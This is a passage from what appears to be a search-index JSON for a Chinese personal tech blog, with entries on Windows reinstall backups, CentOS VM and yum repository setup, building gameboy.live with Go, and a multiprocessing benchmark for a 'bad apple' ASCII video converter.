<li>Moonlight\uff1a\u65e0\u6cd5\u5907\u4efd\uff0c\u5199\u5728\u6ce8\u518c\u8868\u91cc</li> <li>vscode</li> <li>windows terminal\uff1a\u8f6f\u4ef6\u4e2d\u53e6\u5b58 json \u914d\u7f6e</li> <li>snipaste\uff1a\u8f6f\u4ef6\u4e2d\u8bfb\u53d6 config.ini</li> </ul> <p>\u8f6f\u4ef6\u5217\u8868</p> <p>\u5f00\u59cb\u83dc\u5355</p> <p>Home \u00b7 valinet/ExplorerPatcher Wiki <pre><code>$backupDir = \"D:\\backup\\ReinstallWindows\\StartMenu\"\n$regKeyPath = \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\CloudStore\\Store\\Cache\\DefaultAccount\"\n$xmlFilePath = \"$env:LocalAppData\\Microsoft\\Windows\\Shell\\DefaultLayouts.xml\"\n\n# Create the backup directory if it doesn't exist\nif (-not (Test-Path -Path $backupDir)) {\n    New-Item -ItemType Directory -Path $backupDir\n}\n\n# Backup the registry key\n$regBackupFile = Join-Path $backupDir \"DefaultAccount.reg\"\nreg export \"$regKeyPath\" \"$regBackupFile\" /y\n\n# Backup the XML file\n$xmlBackupFile = Join-Path $backupDir \"DefaultLayouts.xml\"\nCopy-Item -Path $xmlFilePath -Destination $xmlBackupFile -Force\n\nWrite-Host \"Backup completed successfully.\"\n</code></pre></p>","tags":["windows","\u91cd\u88c5\u7cfb\u7edf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-windows%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E6%AD%A5%E9%AA%A4/#\u5b89\u88c5-windows-\u65f6\u627e\u4e0d\u5230\u78c1\u76d8","title":"\u5b89\u88c5 windows \u65f6\u627e\u4e0d\u5230\u78c1\u76d8","text":"<p>[Windows 11/10] \u7591\u96be\u89e3\u7b54 - \u5b89\u88c5Windows 11/10\u65f6\u627e\u4e0d\u5230\u78c1\u76d8\u9a71\u52a8\u5668 | \u5b98\u65b9\u652f\u6301 | ASUS \u4e2d\u56fd</p>","tags":["windows","\u91cd\u88c5\u7cfb\u7edf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-windows%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E6%AD%A5%E9%AA%A4/#\u8f6f\u4ef6\u8bbe\u7f6e","title":"\u8f6f\u4ef6\u8bbe\u7f6e","text":"","tags":["windows","\u91cd\u88c5\u7cfb\u7edf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-windows%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E6%AD%A5%E9%AA%A4/#win11-\u663e\u793a\u79d2","title":"win11 \u663e\u793a\u79d2","text":"<p>How to Show Seconds in Taskbar Clock Windows 11? <pre><code>Set-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced -Name ShowSecondsInSystemClock -Value 1 -Force\n</code></pre></p>","tags":["windows","\u91cd\u88c5\u7cfb\u7edf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-windows%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E6%AD%A5%E9%AA%A4/#powertoy","title":"powertoy","text":"<ul> <li>always on top: ctrl + shift + T</li> <li>alt + space \u548c utools \u51b2\u7a81\u4e86\uff0c\u53ef\u4ee5\u6539\u4e3a ctrl + shift + space</li> </ul>","tags":["windows","\u91cd\u88c5\u7cfb\u7edf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/","title":"\u5b89\u88c5 centos \u865a\u62df\u673a\u4ee5\u53ca\u914d\u7f6e gameboy.live \u8bb0\u5f55","text":"<p>\u5b89\u88c5 centos \u865a\u62df\u673a\u4ee5\u53ca\u914d\u7f6e gameboy.live \u8bb0\u5f55</p>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#1-\u4e0b\u8f7d\u955c\u50cf","title":"1. \u4e0b\u8f7d\u955c\u50cf","text":"<p>\u5728\u6e05\u534e\u6e90\u7b49\u955c\u50cf\u6e90\u90fd\u53ef\u4ee5\uff0c\u6211\u4e0b\u8f7d\u7684\u662f everything \u7248\u672c\uff08\u6709 10G \u5de6\u53f3\uff09</p>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#2-virtualbox-\u5b89\u88c5-centos","title":"2. VirtualBox \u5b89\u88c5 CentOS","text":"<p>\u9700\u8981\u9009\u62e9\u5b89\u88c5\u90a3\u4e9b\u8f6f\u4ef6\uff08\u9ed8\u8ba4\u662f minimalist)\uff0c\u6211\u9009\u62e9\u4e86\u624b\u52a8\uff0c\u7136\u540e\u9009\u62e9\u4e86\u7f51\u7edc\u76f8\u5173\u7684\uff08\u9ed8\u8ba4\u6709 sshd)\u3002\u7136\u540e\u8bbe\u7f6e root \u5bc6\u7801\uff0c\u65b0\u5efa\u521d\u59cb\u8d26\u6237\u3002</p>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#3-\u914d\u7f6e\u6362\u6e90","title":"3. \u914d\u7f6e\uff08\u6362\u6e90\uff09","text":"<ol> <li> <p>\u53d1\u73b0\u521a\u5b89\u88c5\u7684 centos \u6ca1\u529e\u6cd5\u4f7f\u7528 yum\uff08repository \u6ca1\u6709\u914d\u7f6e\u597d\uff09\u3002\u627e\u5230\u5982\u4f55\u6362\u6e90\u7684\u65b9\u6cd5\uff0c\u4e3b\u8981\u5206\u4e3a\u672c\u5730\u6e90\uff08iso \u955c\u50cf\u91cc\u6709\u4e00\u4e2a Packages\uff0c\u5305\u542b\u5b98\u65b9\u7684\u6240\u6709\u8f6f\u4ef6 (rpm \u5305)\uff0c10000 \u4e2a\u5de6\u53f3\uff09\u548c\u7f51\u7edc\u6e90\u3002</p> </li> <li> <p>\u5148\u5b89\u88c5\u4e0b VBox \u6269\u5c55\uff0c</p> <pre><code>mkdir /mnt/cdrom\nmount /dev/cdrom /mnt/cdrom\ncd /mnt/cdrom\n./VBoxLinuxAdditions.run (\u4e2d\u9014\u4f1a\u7f16\u8bd1)\n</code></pre> <p>\u4e4b\u540e\u53ef\u4ee5\u8bbe\u7f6e\u5171\u4eab\u6587\u4ef6\u5939\uff0c\u526a\u5207\u677f\u7b49\u3002</p> </li> <li> <p>\u5b89\u88c5\u672c\u5730\u6e90\uff1a</p> <ol> <li> <p>\u6302\u8f7d centos \u7cfb\u7edf\u955c\u50cf\uff08everything \u90a3\u4e2a\uff09:</p> <p>\u5148\u5728\u865a\u62df\u673a\u8bbe\u7f6e\u91cc\u5b58\u50a8\uff0cIDE \u63a7\u5236\u5668\u90a3\u5206\u914d\u5149\u9a71\uff0c\u628a iso \u6dfb\u52a0\u8fdb\u53bb\u3002</p> <pre><code>mkdir /media/cdrom\nmount /dev/cdrom /media/cdrom\n</code></pre> </li> <li> <p>\u4fee\u6539\u6e90\u914d\u7f6e\u6587\u4ef6</p> <p>- /etc/yum.config\u5305\u542bmain\u914d\u7f6e\uff0c\u5728/etc/yum.repos.d/\u4e0b\u4e3a\u5404\u79cd\u6e90\uff08\u672c\u5730\u6e90CentOS-Media.repo\uff0c\u7f51\u7edc\u6e90CentOS-Base.repo\uff09</p> <p>- \u7531\u4e8e/media/cdrom \u5df2\u7ecf\u5728 baseurl \u91cc\u6709\u4e86\uff0c\u6545\u53ea\u9700\u5c06 enabled \u8bbe\u4e3a 1 \u5373\u53ef</p> <p>- \u5c06 CenOS-Base.repo \u91cd\u547d\u540d\u4e3a\u5176\u5b83</p> </li> <li> <p>\u4f7f\u4e4b\u751f\u6548</p> <pre><code>yum clean all\nyum makecache\n</code></pre> <p>\u6109\u5feb\u5730\u5b89\u88c5 vim, git, python \u5427\u3002</p> <p>\u4e0d\u77e5\u9053\u5982\u4f55\u5b89\u88c5 netstat\uff0cifconfig\uff1f\u76f4\u63a5 yum search xxx \u4f1a\u544a\u8bc9\u4f60\u7b54\u6848\u3002</p> </li> </ol> </li> <li> <p>\u8bbe\u7f6e\u955c\u50cf\u6e90</p> <p>\u963f\u91cc\u4e91\u955c\u50cf\u6bd4\u8f83\u9f50\u5168\uff0c\u4e14\u6709\u5e2e\u52a9\u6587\u6863\u3002https://developer.aliyun.com/mirror/</p> </li> </ol>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#4-\u914d\u7f6e-gameboylive","title":"4 \u914d\u7f6e gameboy.live","text":"","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#1-\u5b89\u88c5-golang","title":"1. \u5b89\u88c5 golang","text":"<p>yum install \u4f1a\u663e\u793a\u6ca1\u6709 golang\uff0c\u6216\u8005\u7248\u672c\u4e0d\u591f\u65b0</p> <p>\u5728\u5b98\u7f51\u4e0a\u6709\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684 golang\uff0c\u76f4\u63a5\u4e0b\u8f7d\u89e3\u538b\u5c31\u53ef\u4ee5\u4f7f\u7528\u3002</p> <pre><code>wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz\nsudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz\n\u6dfb\u52a0PATH\u53d8\u91cf\n\ngo version #\u67e5\u770b\u7248\u672c\n</code></pre> <p>tips: \u5173\u4e8e linux \u5b89\u88c5\u8def\u5f84\uff1a</p> <ul> <li>/usr \u76ee\u5f55\u4e0b\u4e3a\u7cfb\u7edf\u8f6f\u4ef6\u76ee\u5f55\uff0c\u6709/usr/bin, /usr/lib\u7b49\u6587\u4ef6\u5939\u3002\u76f8\u5f53\u4e8ewindows\u7684C://windows/</li> <li>/usr/local\u4e3a\u7528\u6237\u8f6f\u4ef6\u76ee\u5f55\uff0c\u4e5f\u6709/usr/local/bin, /usr/local/lib\u7b49\u3002\u7528\u6237\u5b89\u88c5\u7684\u8f6f\u4ef6\u9ed8\u8ba4\u4f1a\u5b89\u88c5\u5728\u8fd9\u91cc\u3002\u76f8\u5f53\u4e8eC://Program Files/</li> <li>/opt\uff0c\u4ee3\u8868\u53ef\u9009\u8f6f\u4ef6\uff0c\u5982 firefox \u7b49\u72ec\u7acb\u7684\u5927\u578b\u8f6f\u4ef6\u53ef\u4ee5\u5b89\u88c5\u5728\u8fd9\u91cc\u3002\u76f8\u5f53\u4e8e D://</li> </ul>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#2-\u914d\u7f6e-golang-\u4ee3\u7406","title":"2. \u914d\u7f6e golang \u4ee3\u7406","text":"<p>\u76f4\u63a5 go get \u5f88\u5bb9\u6613\u8d85\u65f6\u3002</p> <pre><code>go env -w GO111MODULE=on\ngo env -w GOPROXY=https://goproxy.cn,direct\n</code></pre> <p>\u53ef\u4ee5\u67e5\u770b https://goproxy.cn \u5b98\u7f51\u4ecb\u7ecd</p>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#3-\u5b89\u88c5-x11","title":"3. \u5b89\u88c5 x11","text":"<p>\u76f4\u63a5 go \u7f16\u8bd1 gameboy.live \u4f1a\u62a5\u5404\u79cd.h \u6587\u4ef6\u627e\u4e0d\u5230\u3002\u4ee5\u4e0b</p> <pre><code># https://github.com/go-gl/glfw\n...\n\nyum install libX11-devel libXcursor-devel libXrandr-devel libXinerama-devel mesa-libGL-devel libXi-devel\n\n\n# github.com/hajimehoshi/oto\n../../go/pkg/mod/github.com/hajimehoshi/oto@v0.3.1/driver_linux.go:23:28: fatal error: alsa/asoundlib.h: No such file or directory\n\nyum install alsa-lib-devel (ubuntu\u4e0b\u7684\u5b89\u88c5libasound2\u5c31\u597d\u4e86\uff0cyum\u4e0b\u597d\u4e0d\u5bb9\u6613\u624d\u627e\u5230\u53ef\u4ee5\u5b89\u88c5\u8fd9\u4e2a\u4ee3\u66fflibasound2\u3002)\n</code></pre>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#4-\u8fd0\u884c","title":"4. \u8fd0\u884c","text":"<ul> <li>\u53d1\u73b0\u7531\u4e8e mobaxterm \u81ea\u5e26 x11server\uff0c\u56e0\u6b64\u5728\u963f\u91cc\u4e91\u4e0a\u8fd0\u884c\uff0c\u4fbf\u4f1a\u81ea\u52a8\u6253\u5f00\u56fe\u5f62\u7a97\u53e3\u3002</li> </ul> <ul> <li>\u53d1\u73b0\u5728 putty \u4e0a\u53ef\u4ee5\u6b63\u786e\u663e\u793a\uff0c\u4f46\u6309\u952e\u53ea\u6709 Enter \u8d77\u4f5c\u7528\uff0cctrl+z \u7b49\u53ef\u4ee5\u4ea7\u751f Right \u7684\u6548\u679c\u3002</li> <li>\u5728 VB \u865a\u62df\u673a\uff08\u65e0\u56fe\u5f62\u754c\u9762\uff09\u4e0a\u65e0\u6cd5\u6b63\u786e\u663e\u793a\u753b\u9762\u3002WSL \u4e0a\u4e5f\u4e0d\u884c\u3002</li> <li>\u5728 ubuntu \u684c\u9762\u7248\u7684\u7ec8\u7aef\u53ef\u4ee5\u5b8c\u7f8e\u8fd0\u884c\u3002</li> </ul>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#5-\u7ed3\u675f-ssh-\u540e\u4e0d\u505c\u6b62\u8fd0\u884c","title":"5. \u7ed3\u675f ssh \u540e\u4e0d\u505c\u6b62\u8fd0\u884c","text":"<p>https://blog.csdn.net/v1v1wang/article/details/6855552</p>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/04/09/2020-04-09-CloudView%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8Cbad%20apple/","title":"CloudView \u5e73\u53f0\u8fd0\u884c bad apple","text":"<p>\u91cd\u5199\u4e86 bad-apple \u7684\u4ee3\u7801\uff0c\u5229\u7528\u4e86\u591a\u8fdb\u7a0b\u7684\u65b9\u5f0f\u8fdb\u884c\u89c6\u9891\u8f6c\u6362\u3002</p> <p>\u4ee5\u4e0b\u662f\u5404\u4e2a\u914d\u7f6e\u8f6c\u6362 bad apple.mp4 \u7684\u65f6\u95f4</p> \u7ebf\u6027\u6267\u884c 4 \u7ebf\u7a0b 1 \u8fdb\u7a0b 2 \u8fdb\u7a0b 4 \u8fdb\u7a0b 8 \u8fdb\u7a0b 16 \u8fdb\u7a0b \u65f6\u95f4 (\u79d2) 34.97 34.70 35.05 24.15 18.11 18.09 18 <p>\u5176\u4e2d\u7ebf\u7a0b\u4e3a\u91c7\u7528 threading \u5e93\uff0c\u8fdb\u7a0b\u5219\u91c7\u7528 multiprocessing \u5e93</p> <p>\u6211\u7684\u7535\u8111\u914d\u7f6e\u4e3a\uff1a</p> CPU intel(R) Core(TM) i5-7200U CPU @ 2.50GHz 2.70GHz RAM 8.00 GB Windows Windows10 \u5bb6\u5ead\u7248 1909 18363.720 <p>\u5b98\u65b9\u6587\u6863\u8bf4\u660e\u4e86 threading \u5e93\u5e95\u5c42\u5b9e\u73b0\u65f6\u4ecd\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u56e0\u800c\u53ea\u9002\u7528\u4e8e\u5927\u91cf I/O \u5e76\u53d1\u7684\u60c5\u51b5\u3002\u800c\u6211\u4eec\u7684\u56fe\u7247\u8f6c\u6362\u6210\u5b57\u7b26\u753b\u7684\u8fc7\u7a0b\u4e3b\u8981\u662f\u8ba1\u7b97\u5bc6\u96c6\u578b\uff0c\u56e0\u6b64\u57fa\u672c\u6ca1\u6709\u6539\u5584\u6027\u80fd\u3002</p> <p>\u800c\u91c7\u7528\u591a\u8fdb\u7a0b\u65f6\uff0c\u521a\u597d\u5bf9\u5e94\u6211\u7535\u8111\u7684 4 \u7ebf\u7a0b\uff082 \u6838\uff0c\u91c7\u7528\u8d85\u7ebf\u7a0b\u6280\u672f\u53ef\u4ee5\u6709 4 \u4e2a\u7ebf\u7a0b\uff0c\u5176\u5b9e\u8fd9\u91cc\u8fdb\u7a0b\u7ebf\u7a0b\u6709\u70b9\u6655\uff09\u65f6\u63d0\u5347\u6700\u5927\u3002</p> <p>\u4e8e\u662f\u4fbf\u60f3\u77e5\u9053 32 \u4e2a\u6838\u65f6\uff0c\u80fd\u63d0\u5347\u591a\u5c11\uff0c\u4fbf\u60f3\u5728\u670d\u52a1\u5668\u4e0a\u8dd1\u8dd1\u770b\u3002\u4ee5\u4e0b\u662f\u914d\u7f6e\u8fd0\u884c\u8fc7\u7a0b\u3002</p> <p>\u51fa\u4eba\u610f\u6599\u7684\u7ed3\u679c\uff1a</p> 1 \u8fdb\u7a0b 4 \u7ebf\u7a0b 8 \u8fdb\u7a0b 16 \u8fdb\u7a0b 32 \u8fdb\u7a0b \u65f6\u95f4 (\u79d2) 51 24 23.22 21.57 21.14 <p>\u53ef\u80fd\u8fdb\u7a0b\u591a\u4e86\u540e\uff0c\u5199\u6587\u4ef6\u7684\u901f\u5ea6\u53cd\u800c\u6210\u4e86\u74f6\u9888\uff0c\u67e5\u770b top \u53d1\u73b0\u5404\u4e2a\u6838\u7684 cpu \u5229\u7528\u7387\u90fd\u53ea\u6709 10% \u5de6\u53f3\uff0c\u5728\u4ee3\u7801\u4e2d\u8f93\u51fa cvt_frame.qsize() \u4e5f\u53d1\u73b0\u51e0\u4e4e\u90fd\u662f\u6ee1\u7684\u3002\uff08\u5728\u81ea\u5df1\u7535\u8111\u4e0a\u5927\u591a\u6570\u90fd\u662f 0\uff0c\u8868\u660e cvt_frame \u4f9b\u4e0d\u5e94\u6c42\uff09</p>","tags":["cloudview","bad-apple"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/04/09/2020-04-09-CloudView%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8Cbad%20apple/#\u5b89\u88c5-python3","title":"\u5b89\u88c5 python3","text":"<p>\u9996\u5148\u53d1\u73b0\u6ca1\u6709 python3\uff0c\u4e8e\u662f\u60f3\u529e\u6cd5\u53bb\u5b89\u88c5 python3\u3002</p>","tags":["cloudview","bad-apple"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/04/09/2020-04-09-CloudView%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8Cbad%20apple/#\u65b9\u6cd5-1\u7f16\u8bd1\u5b89\u88c5","title":"\u65b9\u6cd5 1\uff1a\u7f16\u8bd1\u5b89\u88c5","text":"<p>ipython \u5b98\u7f51\u4e0b\u8f7d python3 \u6e90\u7801\uff0c\u8fd9\u91cc\u4e0b\u8f7d\u4e86 python3.6.10</p> <p>\u7136\u540e\u89e3\u538b\u5230/usr/local/src</p> <pre><code>sudo tar zxf Python-3.6.10.tgz -C /usr/local/src/\n</code></pre> <p>cd \u5230\u89e3\u538b\u76ee\u5f55\uff0c\u7f16\u8bd1\u5b89\u88c5</p> <pre><code>./configure\nsudo make\nsudo make install\n</code></pre> <p>\u5230\u8fd9\u91cc\u53ef\u80fd\u4f1a\u62a5\u8bb8\u591a\u9519\u8bef\uff0c\u8fd9\u662f\u7f3a\u5c11\u4e00\u4e9b\u5e93\u5bfc\u81f4\u7684\u3002</p> <p>\u8bd5\u9519\u540e\u77e5\u9053\u9700\u8981 zlib, openssl \u5e93\uff08\u53bb\u5b98\u7f51\u4e0b\u8f7d\u6e90\u7801\uff0c\u7f16\u8bd1\u5b89\u88c5\uff09</p> <p>\u4e8b\u5b9e\u4e0a\u641c\u7d22 centos \u7f16\u8bd1\u5b89\u88c5 python3 \u4f1a\u544a\u8bc9\u4f60\u9700\u8981\u4ee5\u4e0b\u8fd9\u4e48\u591a\u5e93\uff0c\u7531\u4e8e\u8fd9\u91cc\u662f\u5185\u7f51\u73af\u5883\uff0c\u56e0\u6b64\u53ea\u80fd\u4e00\u4e2a\u4e00\u4e2a\u53bb\u4e0b\u8f7d\u7f16\u8bd1\u3002\uff08\u4f46\u4e8b\u5b9e\u4e0a\u53ef\u4ee5\u4f7f\u7528\u65b9\u6cd5 2 \u4e2d\u7684\u65b9\u6cd5\uff0c\u642d\u597d yum \u7684\u672c\u5730\u6e90\uff0c\u4ece\u800c\u53ef\u4ee5\u4f7f\u7528 yum\uff0c\u867d\u7136\u8fd9\u6837\u7684\u8bdd\u53ef\u4ee5\u76f4\u63a5\u7528 yum \u5b89\u88c5 python\uff0c\u4f46\u662f\u672c\u5730\u6e90\u4e2d\u7684 python \u4e3a\u56fa\u5b9a\u7248\u672c\uff0c\u800c\u7f16\u8bd1\u5b89\u88c5\u53ef\u4ee5\u4ece\u5b98\u7f51\u4e0a\u4e0b\u8f7d\u4e0d\u540c\u7684\u7248\u672c\u3002\u5e76\u4e14\u63a8\u5e7f\u6765\u8bf4\uff0c\u5bf9\u4e8e\u4e00\u4e9b\u5fc5\u987b\u7f16\u8bd1\u5b89\u88c5\u7684\u8f6f\u4ef6\uff0c\u901a\u8fc7 yum \u5b89\u88c5\u5fc5\u8981\u7684\u5e93\uff0c\u7136\u540e\u7f16\u8bd1\u5b89\u88c5\u662f\u4e00\u79cd\u6bd4\u8f83\u597d\u7684\u65b9\u5f0f\uff09</p> <pre><code>yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel libffi-devel gcc make\n</code></pre> <p>\u4e0a\u9762\u7684\u9ed8\u8ba4\u5b89\u88c5\u8def\u5f84\u4e3a/usr/loacl/bin\uff0c\u5e93\u6587\u4ef6\u5219\u5b89\u88c5\u5230/usr/local/lib\u3002\uff08\u4e5f\u6709\u53ef\u80fd/usr/local/lib64\uff09</p> <p>\u5982\u679c\u81ea\u5b9a\u4e49\u5b89\u88c5\u8def\u5f84\u5982\uff0c./configure --prefix=/usr/local/python3</p> <p>\u9700\u8981\u6dfb\u52a0\u52a8\u6001\u8fde\u63a5\u5e93\u8def\u5f84\u3002\u5373\u5728/etc/ld.so.conf \u91cc\u6dfb\u52a0/usr/local/python3/lib</p> <p>\u8fd8\u662f\u9ed8\u8ba4\u8def\u5f84\u6bd4\u8f83\u597d\uff0c\u4e0d\u8fc7\u81ea\u5b9a\u4e49\u5b89\u88c5\u8def\u5f84\u53ef\u4ee5\u4e0d\u9700\u8981 root \u6743\u9650\u3002\uff08\u53ea\u8981\u628a\u7a0b\u5e8f\u5b89\u88c5\u5230\u975e root \u7528\u6237\u53ef\u4ee5\u8bfb\u5199\u7684\u76ee\u5f55\u4e0b\u5c31\u53ef\uff0c\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u9700\u8981 root \u6743\u9650\uff0c\u4f46\u7528\u6237\u7684 home \u8def\u5f84\u4e0b\u5e94\u8be5\u53ef\u4ee5\u968f\u4fbf\u88c5\u3002\u8fd8\u6709\u975e root \u5b89\u88c5\u65f6\uff0c\u6700\u540e\u9700\u8981\u91cc\u6dfb\u52a0\u73af\u5883\u53d8\u91cf LD_LIBTARY_PATH\uff0c\u800c\u4e0d\u662f\u4fee\u6539 ld.so.conf(\u9700\u8981 root \u6743\u9650)\uff09</p>","tags":["cloudview","bad-apple"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/04/09/2020-04-09-CloudView%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8Cbad%20apple/#\u65b9\u6cd5-2","title":"\u65b9\u6cd5 2","text":"<p>\u914d\u7f6e\u672c\u5730 yum \u6e90</p> <ol> <li> <p>\u4e0a\u4f20 CentOS \u7cfb\u7edf iso \u6587\u4ef6\uff0c\u5927\u6982 11G</p> </li> <li> <p>\u6302\u8f7d\u955c\u50cf\u6587\u4ef6</p> <pre><code>mount CentOS-7-x86_64-Everything-1908.iso /media/cdrom\n</code></pre> </li> <li> <p>\u914d\u7f6e\u5730 yum \u6e90\uff0c\u4fee\u6539/etc/yum.repo.d/CentOS-Media.repo\uff0c\u628a enabled \u7f6e 1\uff0c\u56e0\u4e3a baseurl \u4e2d\u5df2\u7ecf\u6709\u4e86/media/cdrom \u6545\u4e0d\u7528\u6539\uff0c\u5982\u679c\u4e0a\u4e00\u6b65\u6302\u8f7d\u8def\u5f84\u4e3a\u5176\u5b83\uff0c\u5219\u6dfb\u52a0\u5230\u5176\u4e2d\u3002</p> <pre><code>[root@centos1 temp]# cat /etc/yum.repos.d/CentOS-Media.repo\n# CentOS-Media.repo\n#\n#  This repo can be used with mounted DVD media, verify the mount point for\n#  CentOS-7.  You can use this repo and yum to install items directly off the\n#  DVD ISO that we release.\n#\n# To use this repo, put in your DVD and use it with the other repos too:\n#  yum --enablerepo=c7-media [command]\n#\n# or for ONLY the media repo, do this:\n#\n#  yum --disablerepo=\\* --enablerepo=c7-media [command]\n\n[c7-media]\nname=CentOS-$releasever - Media\nbaseurl=file:///media/CentOS/\n        file:///media/cdrom/\n        file:///media/cdrecorder/\ngpgcheck=1\nenabled=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n</code></pre> </li> <li> <p>\u53ef\u4ee5\u4f7f\u7528 yum \u5b89\u88c5\u4e00\u4e9b\u5e38\u89c1\u7684\u8f6f\u4ef6\u4e86\u3002</p> </li> </ol> <p>\u6211\u5148\u91c7\u7528\u4e86\u65b9\u5f0f 1\uff0c\u867d\u7136\u53ef\u4ee5\u8fd0\u884c python \u4e86\uff0c\u4f46\u7f16\u8bd1\u65f6\u7684\u5404\u79cd\u7f3a\u5e93\u7684\u62a5\u9519\u603b\u8ba9\u6211\u89c9\u5f97\u5b83\u6709\u4e00\u4e9b\u95ee\u9898\u3002\u540e\u9762\u53c8\u91c7\u7528\u4e86\u65b9\u5f0f 2 \u6765\u5b89\u88c5 python</p>","tags":["cloudview","bad-apple"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/04/09/2020-04-09-CloudView%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8Cbad%20apple/#\u79bb\u7ebf\u5b89\u88c5-opencv","title":"\u79bb\u7ebf\u5b89\u88c5 opencv","text":"<p>bad apple \u4ee3\u7801\u9700\u8981 import cv2\uff0ccv2 \u6a21\u5757\u662f opencv-python \u91cc\u7684\uff0c\u9700\u8981\u5b89\u88c5 opencv-python \u5305\u3002\u7531\u4e8e\u662f\u5185\u7f51\uff0c\u56e0\u6b64\u53ea\u80fd\u91c7\u7528\u79bb\u7ebf\u5b89\u88c5\u7684\u65b9\u5f0f\u3002</p> <p>\u79bb\u7ebf\u5b89\u88c5 python \u5305</p> <ol> <li> <p>\u53bb\u955c\u50cf\u7f51\u7ad9\u5bfb\u627e\u5230\u9700\u8981\u7684.whl \u6587\u4ef6\u3002\u5982\u6e05\u534e\u7684\u955c\u50cf\u6e90\u76ee\u5f55\u7ed3\u6784\u4e3a/pypi/web/simple \u4e0b\u3002\u4f46\u8fd9\u79cd\u65b9\u5f0f\u5bfb\u627e\u8d77\u6765\u5b83\u9ebb\u70e6\u4e86\u3002\u800c\u4e14 python 